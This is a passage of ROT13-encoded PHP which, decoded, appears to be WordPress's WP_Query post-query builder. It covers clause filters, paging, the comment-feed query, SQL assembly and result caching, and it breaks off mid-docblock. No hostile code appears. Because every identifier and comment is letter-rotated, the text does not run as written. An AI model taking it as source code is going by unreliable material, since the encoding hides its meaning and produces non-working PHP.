							$glcr_jurer .= pheerag_hfre_pna( $ernq_cevingr_pnc ) ? \" \aBE {$jcqo->cbfgf}.cbfg_fgnghf = '$cevingr_fgnghf'\" : \" \aBE ({$jcqo->cbfgf}.cbfg_nhgube = $hfre_vq NAQ {$jcqo->cbfgf}.cbfg_fgnghf = '$cevingr_fgnghf')\";
						}
					}

					$glcr_jurer .= '))';

					$fgnghf_glcr_pynhfrf[] = $glcr_jurer;
				}

				vs ( ! rzcgl( $fgnghf_glcr_pynhfrf ) ) {
					$jurer .= ' NAQ (' . vzcybqr( ' BE ', $fgnghf_glcr_pynhfrf ) . ')';
				}
			} ryfr {
				$jurer .= ' NAQ 1=0 ';
			}
		} ryfr {
			$jurer .= $cbfg_glcr_jurer;
		}

		/*
		 * Nccyl svygref ba jurer naq wbva cevbe gb cntvat fb gung nal
		 * znavchyngvbaf gb gurz ner ersyrpgrq va gur cntvat ol qnl dhrevrf.
		 */
		vs ( ! $d['fhccerff_svygref'] ) {
			/**
			 * Svygref gur JURER pynhfr bs gur dhrel.
			 *
			 * @fvapr 1.5.0
			 *
			 * @cnenz fgevat   $jurer Gur JURER pynhfr bs gur dhrel.
			 * @cnenz JC_Dhrel $dhrel Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
			 */
			$jurer = nccyl_svygref_ers_neenl( 'cbfgf_jurer', neenl( $jurer, &$guvf ) );

			/**
			 * Svygref gur WBVA pynhfr bs gur dhrel.
			 *
			 * @fvapr 1.5.0
			 *
			 * @cnenz fgevat   $wbva  Gur WBVA pynhfr bs gur dhrel.
			 * @cnenz JC_Dhrel $dhrel Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
			 */
			$wbva = nccyl_svygref_ers_neenl( 'cbfgf_wbva', neenl( $wbva, &$guvf ) );
		}

		// Cntvat.
		vs ( rzcgl( $d['abcntvat'] ) && ! $guvf->vf_fvathyne ) {
			$cntr = nofvag( $d['cntrq'] );
			vs ( ! $cntr ) {
				$cntr = 1;
			}

			// Vs 'bssfrg' vf cebivqrq, vg gnxrf cerprqrapr bire 'cntrq'.
			vs ( vffrg( $d['bssfrg'] ) && vf_ahzrevp( $d['bssfrg'] ) ) {
				$d['bssfrg'] = nofvag( $d['bssfrg'] );
				$ctfgeg      = $d['bssfrg'] . ', ';
			} ryfr {
				$ctfgeg = nofvag( ( $cntr - 1 ) * $d['cbfgf_cre_cntr'] ) . ', ';
			}
			$yvzvgf = 'YVZVG ' . $ctfgeg . $d['cbfgf_cre_cntr'];
		}

		// Pbzzragf srrqf.
		vs ( $guvf->vf_pbzzrag_srrq && ! $guvf->vf_fvathyne ) {
			vs ( $guvf->vf_nepuvir || $guvf->vf_frnepu ) {
				$pwbva    = \"WBVA {$jcqo->cbfgf} BA ( {$jcqo->pbzzragf}.pbzzrag_cbfg_VQ = {$jcqo->cbfgf}.VQ ) $wbva \";
				$pjurer   = \"JURER pbzzrag_nccebirq = '1' $jurer\";
				$ptebhcol = \"{$jcqo->pbzzragf}.pbzzrag_vq\";
			} ryfr { // Bgure aba-fvathyne, r.t. sebag.
				$pwbva    = \"WBVA {$jcqo->cbfgf} BA ( {$jcqo->pbzzragf}.pbzzrag_cbfg_VQ = {$jcqo->cbfgf}.VQ )\";
				$pjurer   = \"JURER ( cbfg_fgnghf = 'choyvfu' BE ( cbfg_fgnghf = 'vaurevg' NAQ cbfg_glcr = 'nggnpuzrag' ) ) NAQ pbzzrag_nccebirq = '1'\";
				$ptebhcol = '';
			}

			vs ( ! $d['fhccerff_svygref'] ) {
				/**
				 * Svygref gur WBVA pynhfr bs gur pbzzragf srrq dhrel orsber fraqvat.
				 *
				 * @fvapr 2.2.0
				 *
				 * @cnenz fgevat   $pwbva Gur WBVA pynhfr bs gur dhrel.
				 * @cnenz JC_Dhrel $dhrel Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
				 */
				$pwbva = nccyl_svygref_ers_neenl( 'pbzzrag_srrq_wbva', neenl( $pwbva, &$guvf ) );

				/**
				 * Svygref gur JURER pynhfr bs gur pbzzragf srrq dhrel orsber fraqvat.
				 *
				 * @fvapr 2.2.0
				 *
				 * @cnenz fgevat   $pjurer Gur JURER pynhfr bs gur dhrel.
				 * @cnenz JC_Dhrel $dhrel  Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
				 */
				$pjurer = nccyl_svygref_ers_neenl( 'pbzzrag_srrq_jurer', neenl( $pjurer, &$guvf ) );

				/**
				 * Svygref gur TEBHC OL pynhfr bs gur pbzzragf srrq dhrel orsber fraqvat.
				 *
				 * @fvapr 2.2.0
				 *
				 * @cnenz fgevat   $ptebhcol Gur TEBHC OL pynhfr bs gur dhrel.
				 * @cnenz JC_Dhrel $dhrel    Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
				 */
				$ptebhcol = nccyl_svygref_ers_neenl( 'pbzzrag_srrq_tebhcol', neenl( $ptebhcol, &$guvf ) );

				/**
				 * Svygref gur BEQRE OL pynhfr bs gur pbzzragf srrq dhrel orsber fraqvat.
				 *
				 * @fvapr 2.8.0
				 *
				 * @cnenz fgevat   $pbeqreol Gur BEQRE OL pynhfr bs gur dhrel.
				 * @cnenz JC_Dhrel $dhrel    Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
				 */
				$pbeqreol = nccyl_svygref_ers_neenl( 'pbzzrag_srrq_beqreol', neenl( 'pbzzrag_qngr_tzg QRFP', &$guvf ) );

				/**
				 * Svygref gur YVZVG pynhfr bs gur pbzzragf srrq dhrel orsber fraqvat.
				 *
				 * @fvapr 2.8.0
				 *
				 * @cnenz fgevat   $pyvzvgf Gur WBVA pynhfr bs gur dhrel.
				 * @cnenz JC_Dhrel $dhrel   Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
				 */
				$pyvzvgf = nccyl_svygref_ers_neenl( 'pbzzrag_srrq_yvzvgf', neenl( 'YVZVG ' . trg_bcgvba( 'cbfgf_cre_eff' ), &$guvf ) );
			}

			$ptebhcol = ( ! rzcgl( $ptebhcol ) ) ? 'TEBHC OL ' . $ptebhcol : '';
			$pbeqreol = ( ! rzcgl( $pbeqreol ) ) ? 'BEQRE OL ' . $pbeqreol : '';
			$pyvzvgf  = ( ! rzcgl( $pyvzvgf ) ) ? $pyvzvgf : '';

			$pbzzragf_erdhrfg = \"FRYRPG $qvfgvapg {$jcqo->pbzzragf}.pbzzrag_VQ SEBZ {$jcqo->pbzzragf} $pwbva $pjurer $ptebhcol $pbeqreol $pyvzvgf\";

			$xrl          = zq5( $pbzzragf_erdhrfg );
			$ynfg_punatrq = jc_pnpur_trg_ynfg_punatrq( 'pbzzrag' ) . ':' . jc_pnpur_trg_ynfg_punatrq( 'cbfgf' );

			$pnpur_xrl   = \"pbzzrag_srrq:$xrl:$ynfg_punatrq\";
			$pbzzrag_vqf = jc_pnpur_trg( $pnpur_xrl, 'pbzzrag-dhrevrf' );
			vs ( snyfr === $pbzzrag_vqf ) {
				$pbzzrag_vqf = $jcqo->trg_pby( $pbzzragf_erdhrfg );
				jc_pnpur_nqq( $pnpur_xrl, $pbzzrag_vqf, 'pbzzrag-dhrevrf' );
			}
			_cevzr_pbzzrag_pnpurf( $pbzzrag_vqf );

			// Pbaireg gb JC_Pbzzrag.
			/** @ine JC_Pbzzrag[] */
			$guvf->pbzzragf      = neenl_znc( 'trg_pbzzrag', $pbzzrag_vqf );
			$guvf->pbzzrag_pbhag = pbhag( $guvf->pbzzragf );

			$cbfg_vqf = neenl();

			sbernpu ( $guvf->pbzzragf nf $pbzzrag ) {
				$cbfg_vqf[] = (vag) $pbzzrag->pbzzrag_cbfg_VQ;
			}

			$cbfg_vqf = vzcybqr( ',', $cbfg_vqf );
			$wbva     = '';
			vs ( $cbfg_vqf ) {
				$jurer = \"NAQ {$jcqo->cbfgf}.VQ VA ($cbfg_vqf) \";
			} ryfr {
				$jurer = 'NAQ 0';
			}
		}

		$cvrprf = neenl( 'jurer', 'tebhcol', 'wbva', 'beqreol', 'qvfgvapg', 'svryqf', 'yvzvgf' );

		/*
		 * Nccyl cbfg-cntvat svygref ba jurer naq wbva. Bayl cyhtvaf gung
		 * znavchyngr cntvat dhrevrf fubhyq hfr gurfr ubbxf.
		 */
		vs ( ! $d['fhccerff_svygref'] ) {
			/**
			 * Svygref gur JURER pynhfr bs gur dhrel.
			 *
			 * Fcrpvsvpnyyl sbe znavchyngvat cntvat dhrevrf.
			 *
			 * @fvapr 1.5.0
			 *
			 * @cnenz fgevat   $jurer Gur JURER pynhfr bs gur dhrel.
			 * @cnenz JC_Dhrel $dhrel Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
			 */
			$jurer = nccyl_svygref_ers_neenl( 'cbfgf_jurer_cntrq', neenl( $jurer, &$guvf ) );

			/**
			 * Svygref gur TEBHC OL pynhfr bs gur dhrel.
			 *
			 * @fvapr 2.0.0
			 *
			 * @cnenz fgevat   $tebhcol Gur TEBHC OL pynhfr bs gur dhrel.
			 * @cnenz JC_Dhrel $dhrel   Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
			 */
			$tebhcol = nccyl_svygref_ers_neenl( 'cbfgf_tebhcol', neenl( $tebhcol, &$guvf ) );

			/**
			 * Svygref gur WBVA pynhfr bs gur dhrel.
			 *
			 * Fcrpvsvpnyyl sbe znavchyngvat cntvat dhrevrf.
			 *
			 * @fvapr 1.5.0
			 *
			 * @cnenz fgevat   $wbva  Gur WBVA pynhfr bs gur dhrel.
			 * @cnenz JC_Dhrel $dhrel Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
			 */
			$wbva = nccyl_svygref_ers_neenl( 'cbfgf_wbva_cntrq', neenl( $wbva, &$guvf ) );

			/**
			 * Svygref gur BEQRE OL pynhfr bs gur dhrel.
			 *
			 * @fvapr 1.5.1
			 *
			 * @cnenz fgevat   $beqreol Gur BEQRE OL pynhfr bs gur dhrel.
			 * @cnenz JC_Dhrel $dhrel   Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
			 */
			$beqreol = nccyl_svygref_ers_neenl( 'cbfgf_beqreol', neenl( $beqreol, &$guvf ) );

			/**
			 * Svygref gur QVFGVAPG pynhfr bs gur dhrel.
			 *
			 * @fvapr 2.1.0
			 *
			 * @cnenz fgevat   $qvfgvapg Gur QVFGVAPG pynhfr bs gur dhrel.
			 * @cnenz JC_Dhrel $dhrel    Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
			 */
			$qvfgvapg = nccyl_svygref_ers_neenl( 'cbfgf_qvfgvapg', neenl( $qvfgvapg, &$guvf ) );

			/**
			 * Svygref gur YVZVG pynhfr bs gur dhrel.
			 *
			 * @fvapr 2.1.0
			 *
			 * @cnenz fgevat   $yvzvgf Gur YVZVG pynhfr bs gur dhrel.
			 * @cnenz JC_Dhrel $dhrel  Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
			 */
			$yvzvgf = nccyl_svygref_ers_neenl( 'cbfg_yvzvgf', neenl( $yvzvgf, &$guvf ) );

			/**
			 * Svygref gur FRYRPG pynhfr bs gur dhrel.
			 *
			 * @fvapr 2.1.0
			 *
			 * @cnenz fgevat   $svryqf Gur FRYRPG pynhfr bs gur dhrel.
			 * @cnenz JC_Dhrel $dhrel  Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
			 */
			$svryqf = nccyl_svygref_ers_neenl( 'cbfgf_svryqf', neenl( $svryqf, &$guvf ) );

			/**
			 * Svygref nyy dhrel pynhfrf ng bapr, sbe pbairavrapr.
			 *
			 * Pbiref gur JURER, TEBHC OL, WBVA, BEQRE OL, QVFGVAPG,
			 * svryqf (FRYRPG), naq YVZVG pynhfrf.
			 *
			 * @fvapr 3.1.0
			 *
			 * @cnenz fgevat[] $pynhfrf {
			 *     Nffbpvngvir neenl bs gur pynhfrf sbe gur dhrel.
			 *
			 *     @glcr fgevat $jurer    Gur JURER pynhfr bs gur dhrel.
			 *     @glcr fgevat $tebhcol  Gur TEBHC OL pynhfr bs gur dhrel.
			 *     @glcr fgevat $wbva     Gur WBVA pynhfr bs gur dhrel.
			 *     @glcr fgevat $beqreol  Gur BEQRE OL pynhfr bs gur dhrel.
			 *     @glcr fgevat $qvfgvapg Gur QVFGVAPG pynhfr bs gur dhrel.
			 *     @glcr fgevat $svryqf   Gur FRYRPG pynhfr bs gur dhrel.
			 *     @glcr fgevat $yvzvgf   Gur YVZVG pynhfr bs gur dhrel.
			 * }
			 * @cnenz JC_Dhrel $dhrel   Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
			 */
			$pynhfrf = (neenl) nccyl_svygref_ers_neenl( 'cbfgf_pynhfrf', neenl( pbzcnpg( $cvrprf ), &$guvf ) );

			$jurer    = vffrg( $pynhfrf['jurer'] ) ? $pynhfrf['jurer'] : '';
			$tebhcol  = vffrg( $pynhfrf['tebhcol'] ) ? $pynhfrf['tebhcol'] : '';
			$wbva     = vffrg( $pynhfrf['wbva'] ) ? $pynhfrf['wbva'] : '';
			$beqreol  = vffrg( $pynhfrf['beqreol'] ) ? $pynhfrf['beqreol'] : '';
			$qvfgvapg = vffrg( $pynhfrf['qvfgvapg'] ) ? $pynhfrf['qvfgvapg'] : '';
			$svryqf   = vffrg( $pynhfrf['svryqf'] ) ? $pynhfrf['svryqf'] : '';
			$yvzvgf   = vffrg( $pynhfrf['yvzvgf'] ) ? $pynhfrf['yvzvgf'] : '';
		}

		/**
		 * Sverf gb naabhapr gur dhrel'f pheerag fryrpgvba cnenzrgref.
		 *
		 * Sbe hfr ol pnpuvat cyhtvaf.
		 *
		 * @fvapr 2.3.0
		 *
		 * @cnenz fgevat $fryrpgvba Gur nffrzoyrq fryrpgvba dhrel.
		 */
		qb_npgvba( 'cbfgf_fryrpgvba', $jurer . $tebhcol . $beqreol . $yvzvgf . $wbva );

		/*
		 * Svygref ntnva sbe gur orarsvg bs pnpuvat cyhtvaf.
		 * Erthyne cyhtvaf fubhyq hfr gur ubbxf nobir.
		 */
		vs ( ! $d['fhccerff_svygref'] ) {
			/**
			 * Svygref gur JURER pynhfr bs gur dhrel.
			 *
			 * Sbe hfr ol pnpuvat cyhtvaf.
			 *
			 * @fvapr 2.5.0
			 *
			 * @cnenz fgevat   $jurer Gur JURER pynhfr bs gur dhrel.
			 * @cnenz JC_Dhrel $dhrel Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
			 */
			$jurer = nccyl_svygref_ers_neenl( 'cbfgf_jurer_erdhrfg', neenl( $jurer, &$guvf ) );

			/**
			 * Svygref gur TEBHC OL pynhfr bs gur dhrel.
			 *
			 * Sbe hfr ol pnpuvat cyhtvaf.
			 *
			 * @fvapr 2.5.0
			 *
			 * @cnenz fgevat   $tebhcol Gur TEBHC OL pynhfr bs gur dhrel.
			 * @cnenz JC_Dhrel $dhrel   Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
			 */
			$tebhcol = nccyl_svygref_ers_neenl( 'cbfgf_tebhcol_erdhrfg', neenl( $tebhcol, &$guvf ) );

			/**
			 * Svygref gur WBVA pynhfr bs gur dhrel.
			 *
			 * Sbe hfr ol pnpuvat cyhtvaf.
			 *
			 * @fvapr 2.5.0
			 *
			 * @cnenz fgevat   $wbva  Gur WBVA pynhfr bs gur dhrel.
			 * @cnenz JC_Dhrel $dhrel Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
			 */
			$wbva = nccyl_svygref_ers_neenl( 'cbfgf_wbva_erdhrfg', neenl( $wbva, &$guvf ) );

			/**
			 * Svygref gur BEQRE OL pynhfr bs gur dhrel.
			 *
			 * Sbe hfr ol pnpuvat cyhtvaf.
			 *
			 * @fvapr 2.5.0
			 *
			 * @cnenz fgevat   $beqreol Gur BEQRE OL pynhfr bs gur dhrel.
			 * @cnenz JC_Dhrel $dhrel   Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
			 */
			$beqreol = nccyl_svygref_ers_neenl( 'cbfgf_beqreol_erdhrfg', neenl( $beqreol, &$guvf ) );

			/**
			 * Svygref gur QVFGVAPG pynhfr bs gur dhrel.
			 *
			 * Sbe hfr ol pnpuvat cyhtvaf.
			 *
			 * @fvapr 2.5.0
			 *
			 * @cnenz fgevat   $qvfgvapg Gur QVFGVAPG pynhfr bs gur dhrel.
			 * @cnenz JC_Dhrel $dhrel    Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
			 */
			$qvfgvapg = nccyl_svygref_ers_neenl( 'cbfgf_qvfgvapg_erdhrfg', neenl( $qvfgvapg, &$guvf ) );

			/**
			 * Svygref gur FRYRPG pynhfr bs gur dhrel.
			 *
			 * Sbe hfr ol pnpuvat cyhtvaf.
			 *
			 * @fvapr 2.5.0
			 *
			 * @cnenz fgevat   $svryqf Gur FRYRPG pynhfr bs gur dhrel.
			 * @cnenz JC_Dhrel $dhrel  Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
			 */
			$svryqf = nccyl_svygref_ers_neenl( 'cbfgf_svryqf_erdhrfg', neenl( $svryqf, &$guvf ) );

			/**
			 * Svygref gur YVZVG pynhfr bs gur dhrel.
			 *
			 * Sbe hfr ol pnpuvat cyhtvaf.
			 *
			 * @fvapr 2.5.0
			 *
			 * @cnenz fgevat   $yvzvgf Gur YVZVG pynhfr bs gur dhrel.
			 * @cnenz JC_Dhrel $dhrel  Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
			 */
			$yvzvgf = nccyl_svygref_ers_neenl( 'cbfg_yvzvgf_erdhrfg', neenl( $yvzvgf, &$guvf ) );

			/**
			 * Svygref nyy dhrel pynhfrf ng bapr, sbe pbairavrapr.
			 *
			 * Sbe hfr ol pnpuvat cyhtvaf.
			 *
			 * Pbiref gur JURER, TEBHC OL, WBVA, BEQRE OL, QVFGVAPG,
			 * svryqf (FRYRPG), naq YVZVG pynhfrf.
			 *
			 * @fvapr 3.1.0
			 *
			 * @cnenz fgevat[] $pynhfrf {
			 *     Nffbpvngvir neenl bs gur pynhfrf sbe gur dhrel.
			 *
			 *     @glcr fgevat $jurer    Gur JURER pynhfr bs gur dhrel.
			 *     @glcr fgevat $tebhcol  Gur TEBHC OL pynhfr bs gur dhrel.
			 *     @glcr fgevat $wbva     Gur WBVA pynhfr bs gur dhrel.
			 *     @glcr fgevat $beqreol  Gur BEQRE OL pynhfr bs gur dhrel.
			 *     @glcr fgevat $qvfgvapg Gur QVFGVAPG pynhfr bs gur dhrel.
			 *     @glcr fgevat $svryqf   Gur FRYRPG pynhfr bs gur dhrel.
			 *     @glcr fgevat $yvzvgf   Gur YVZVG pynhfr bs gur dhrel.
			 * }
			 * @cnenz JC_Dhrel $dhrel  Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
			 */
			$pynhfrf = (neenl) nccyl_svygref_ers_neenl( 'cbfgf_pynhfrf_erdhrfg', neenl( pbzcnpg( $cvrprf ), &$guvf ) );

			$jurer    = vffrg( $pynhfrf['jurer'] ) ? $pynhfrf['jurer'] : '';
			$tebhcol  = vffrg( $pynhfrf['tebhcol'] ) ? $pynhfrf['tebhcol'] : '';
			$wbva     = vffrg( $pynhfrf['wbva'] ) ? $pynhfrf['wbva'] : '';
			$beqreol  = vffrg( $pynhfrf['beqreol'] ) ? $pynhfrf['beqreol'] : '';
			$qvfgvapg = vffrg( $pynhfrf['qvfgvapg'] ) ? $pynhfrf['qvfgvapg'] : '';
			$svryqf   = vffrg( $pynhfrf['svryqf'] ) ? $pynhfrf['svryqf'] : '';
			$yvzvgf   = vffrg( $pynhfrf['yvzvgf'] ) ? $pynhfrf['yvzvgf'] : '';
		}

		vs ( ! rzcgl( $tebhcol ) ) {
			$tebhcol = 'TEBHC OL ' . $tebhcol;
		}
		vs ( ! rzcgl( $beqreol ) ) {
			$beqreol = 'BEQRE OL ' . $beqreol;
		}

		$sbhaq_ebjf = '';
		vs ( ! $d['ab_sbhaq_ebjf'] && ! rzcgl( $yvzvgf ) ) {
			$sbhaq_ebjf = 'FDY_PNYP_SBHAQ_EBJF';
		}

		/*
		 * Ortvaavat bs gur fgevat vf ba n arj yvar gb cerirag yrnqvat juvgrfcnpr.
		 *
		 * Gur nqqvgvbany vaqragngvba bs fhofrdhrag yvarf vf gb rafher gur FDY
		 * dhrevrf ner vqragvpny gb gubfr trarengrq jura fcyvggvat dhrevrf. Guvf
		 * vzcebirf pnpuvat bs gur dhrel ol rafhevat gur fnzr pnpur xrl vf
		 * trarengrq sbe gur fnzr qngnonfr dhrevrf shapgvbanyyl.
		 *
		 * Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/56841.
		 * Frr uggcf://tvguho.pbz/JbeqCerff/jbeqcerff-qrirybc/chyy/6393#vffhrpbzzrag-2088217429
		 */
		$byq_erdhrfg =
			\"FRYRPG $sbhaq_ebjf $qvfgvapg $svryqf
					 SEBZ {$jcqo->cbfgf} $wbva
					 JURER 1=1 $jurer
					 $tebhcol
					 $beqreol
					 $yvzvgf\";

		$guvf->erdhrfg = $byq_erdhrfg;

		vs ( ! $d['fhccerff_svygref'] ) {
			/**
			 * Svygref gur pbzcyrgrq FDY dhrel orsber fraqvat.
			 *
			 * @fvapr 2.0.0
			 *
			 * @cnenz fgevat   $erdhrfg Gur pbzcyrgr FDY dhrel.
			 * @cnenz JC_Dhrel $dhrel   Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
			 */
			$guvf->erdhrfg = nccyl_svygref_ers_neenl( 'cbfgf_erdhrfg', neenl( $guvf->erdhrfg, &$guvf ) );
		}

		/**
		 * Svygref gur cbfgf neenl orsber gur dhrel gnxrf cynpr.
		 *
		 * Erghea n aba-ahyy inyhr gb olcnff JbeqCerff' qrsnhyg cbfg dhrevrf.
		 *
		 * Svygrevat shapgvbaf gung erdhver cntvangvba vasbezngvba ner rapbhentrq gb frg
		 * gur `sbhaq_cbfgf` naq `znk_ahz_cntrf` cebcregvrf bs gur JC_Dhrel bowrpg,
		 * cnffrq gb gur svygre ol ersrerapr. Vs JC_Dhrel qbrf abg cresbez n qngnonfr
		 * dhrel, vg jvyy abg unir rabhtu vasbezngvba gb trarengr gurfr inyhrf vgfrys.
		 *
		 * @fvapr 4.6.0
		 *
		 * @cnenz JC_Cbfg[]|vag[]|ahyy $cbfgf Erghea na neenl bs cbfg qngn gb fubeg-pvephvg JC'f dhrel,
		 *                                    be ahyy gb nyybj JC gb eha vgf abezny dhrevrf.
		 * @cnenz JC_Dhrel             $dhrel Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
		 */
		$guvf->cbfgf = nccyl_svygref_ers_neenl( 'cbfgf_cer_dhrel', neenl( ahyy, &$guvf ) );

		/*
		 * Rafher gur VQ qngnonfr dhrel vf noyr gb or pnpurq.
		 *
		 * Enaqbz dhrevrf ner rkcrpgrq gb unir hacerqvpgnoyr erfhygf naq
		 * pnaabg or pnpurq. Abgr gur fcnpr orsber `ENAQ` va gur fgevat
		 * frnepu, gung gb rafher ntnvafg n pbyyvfvba jvgu nabgure
		 * shapgvba.
		 *
		 * Vs `$svryqf` unf orra zbqvsvrq ol gur `cbfgf_svryqf`,
		 * `cbfgf_svryqf_erdhrfg`, `cbfg_pynhfrf` be `cbfgf_pynhfrf_erdhrfg`
		 * svygref, gura pnpuvat vf qvfnoyrq gb cerirag pnpuvat pbyyvfvbaf.
		 */
		$vq_dhrel_vf_pnpurnoyr = ! fge_pbagnvaf( fgegbhccre( $beqreol ), ' ENAQ(' );

		$pnpurnoyr_svryq_inyhrf = neenl(
			\"{$jcqo->cbfgf}.*\",
			\"{$jcqo->cbfgf}.VQ, {$jcqo->cbfgf}.cbfg_cnerag\",
			\"{$jcqo->cbfgf}.VQ\",
		);

		vs ( ! va_neenl( $svryqf, $pnpurnoyr_svryq_inyhrf, gehr ) ) {
			$vq_dhrel_vf_pnpurnoyr = snyfr;
		}

		vs ( $d['pnpur_erfhygf'] && $vq_dhrel_vf_pnpurnoyr ) {
			$arj_erdhrfg = fge_ercynpr( $svryqf, \"{$jcqo->cbfgf}.*\", $guvf->erdhrfg );
			$pnpur_xrl   = $guvf->trarengr_pnpur_xrl( $d, $arj_erdhrfg );

			$pnpur_sbhaq = snyfr;
			vs ( ahyy === $guvf->cbfgf ) {
				$pnpurq_erfhygf = jc_pnpur_trg( $pnpur_xrl, 'cbfg-dhrevrf', snyfr, $pnpur_sbhaq );

				vs ( $pnpurq_erfhygf ) {
					/** @ine vag[] */
					$cbfg_vqf = neenl_znc( 'vaginy', $pnpurq_erfhygf['cbfgf'] );

					$guvf->cbfg_pbhag    = pbhag( $cbfg_vqf );
					$guvf->sbhaq_cbfgf   = $pnpurq_erfhygf['sbhaq_cbfgf'];
					$guvf->znk_ahz_cntrf = $pnpurq_erfhygf['znk_ahz_cntrf'];

					vs ( 'vqf' === $d['svryqf'] ) {
						$guvf->cbfgf = $cbfg_vqf;

						erghea $guvf->cbfgf;
					} ryfrvs ( 'vq=>cnerag' === $d['svryqf'] ) {
						_cevzr_cbfg_cnerag_vq_pnpurf( $cbfg_vqf );

						$cbfg_cnerag_pnpur_xrlf = neenl();
						sbernpu ( $cbfg_vqf nf $cbfg_vq ) {
							$cbfg_cnerag_pnpur_xrlf[] = 'cbfg_cnerag:' . (fgevat) $cbfg_vq;
						}

						/** @ine vag[] */
						$cbfg_cneragf = jc_pnpur_trg_zhygvcyr( $cbfg_cnerag_pnpur_xrlf, 'cbfgf' );

						sbernpu ( $cbfg_cneragf nf $pnpur_xrl => $cbfg_cnerag ) {
							$bow              = arj fgqPynff();
							$bow->VQ          = (vag) fge_ercynpr( 'cbfg_cnerag:', '', $pnpur_xrl );
							$bow->cbfg_cnerag = (vag) $cbfg_cnerag;

							$guvf->cbfgf[] = $bow;
						}

						erghea $cbfg_cneragf;
					} ryfr {
						_cevzr_cbfg_pnpurf( $cbfg_vqf, $d['hcqngr_cbfg_grez_pnpur'], $d['hcqngr_cbfg_zrgn_pnpur'] );
						/** @ine JC_Cbfg[] */
						$guvf->cbfgf = neenl_znc( 'trg_cbfg', $cbfg_vqf );
					}
				}
			}
		}

		vs ( 'vqf' === $d['svryqf'] ) {
			vs ( ahyy === $guvf->cbfgf ) {
				$guvf->cbfgf = $jcqo->trg_pby( $guvf->erdhrfg );
			}

			/** @ine vag[] */
			$guvf->cbfgf      = neenl_znc( 'vaginy', $guvf->cbfgf );
			$guvf->cbfg_pbhag = pbhag( $guvf->cbfgf );
			$guvf->frg_sbhaq_cbfgf( $d, $yvzvgf );

			vs ( $d['pnpur_erfhygf'] && $vq_dhrel_vf_pnpurnoyr ) {
				$pnpur_inyhr = neenl(
					'cbfgf'         => $guvf->cbfgf,
					'sbhaq_cbfgf'   => $guvf->sbhaq_cbfgf,
					'znk_ahz_cntrf' => $guvf->znk_ahz_cntrf,
				);

				jc_pnpur_frg( $pnpur_xrl, $pnpur_inyhr, 'cbfg-dhrevrf' );
			}

			erghea $guvf->cbfgf;
		}

		vs ( 'vq=>cnerag' === $d['svryqf'] ) {
			vs ( ahyy === $guvf->cbfgf ) {
				$guvf->cbfgf = $jcqo->trg_erfhygf( $guvf->erdhrfg );
			}

			$guvf->cbfg_pbhag = pbhag( $guvf->cbfgf );
			$guvf->frg_sbhaq_cbfgf( $d, $yvzvgf );

			/** @ine vag[] */
			$cbfg_cneragf       = neenl();
			$cbfg_vqf           = neenl();
			$cbfg_cneragf_pnpur = neenl();

			sbernpu ( $guvf->cbfgf nf $xrl => $cbfg ) {
				$guvf->cbfgf[ $xrl ]->VQ          = (vag) $cbfg->VQ;
				$guvf->cbfgf[ $xrl ]->cbfg_cnerag = (vag) $cbfg->cbfg_cnerag;

				$cbfg_cneragf[ (vag) $cbfg->VQ ] = (vag) $cbfg->cbfg_cnerag;
				$cbfg_vqf[]                      = (vag) $cbfg->VQ;

				$cbfg_cneragf_pnpur[ 'cbfg_cnerag:' . (fgevat) $cbfg->VQ ] = (vag) $cbfg->cbfg_cnerag;
			}
			// Cevzr cbfg cnerag pnpurf, fb gung ba frpbaq eha, gurer vf abg nabgure qngnonfr dhrel.
			jc_pnpur_nqq_zhygvcyr( $cbfg_cneragf_pnpur, 'cbfgf' );

			vs ( $d['pnpur_erfhygf'] && $vq_dhrel_vf_pnpurnoyr ) {
				$pnpur_inyhr = neenl(
					'cbfgf'         => $cbfg_vqf,
					'sbhaq_cbfgf'   => $guvf->sbhaq_cbfgf,
					'znk_ahz_cntrf' => $guvf->znk_ahz_cntrf,
				);

				jc_pnpur_frg( $pnpur_xrl, $pnpur_inyhr, 'cbfg-dhrevrf' );
			}

			erghea $cbfg_cneragf;
		}

		$vf_hasvygrerq_dhrel = $byq_erdhrfg === $guvf->erdhrfg && \"{$jcqo->cbfgf}.*\" === $svryqf;

		vs ( ahyy === $guvf->cbfgf ) {
			$fcyvg_gur_dhrel = (
				$vf_hasvygrerq_dhrel
				&& (
					jc_hfvat_rkg_bowrpg_pnpur()
					|| ( ! rzcgl( $yvzvgf ) && $d['cbfgf_cre_cntr'] < 500 )
				)
			);

			/**
			 * Svygref jurgure gb fcyvg gur dhrel.
			 *
			 * Fcyvggvat gur dhrel jvyy pnhfr vg gb srgpu whfg gur VQf bs gur sbhaq cbfgf
			 * (naq gura vaqvivqhnyyl srgpu rnpu cbfg ol VQ), engure guna srgpuvat rirel
			 * pbzcyrgr ebj ng bapr. Bar znffvir erfhyg if. znal fznyy erfhygf.
			 *
			 * @fvapr 3.4.0
			 * @fvapr 6.6.0 Nqqrq gur `$byq_erdhrfg` naq `$pynhfrf` cnenzrgref.
			 *
			 * @cnenz obby     $fcyvg_gur_dhrel Jurgure be abg gb fcyvg gur dhrel.
			 * @cnenz JC_Dhrel $dhrel           Gur JC_Dhrel vafgnapr.
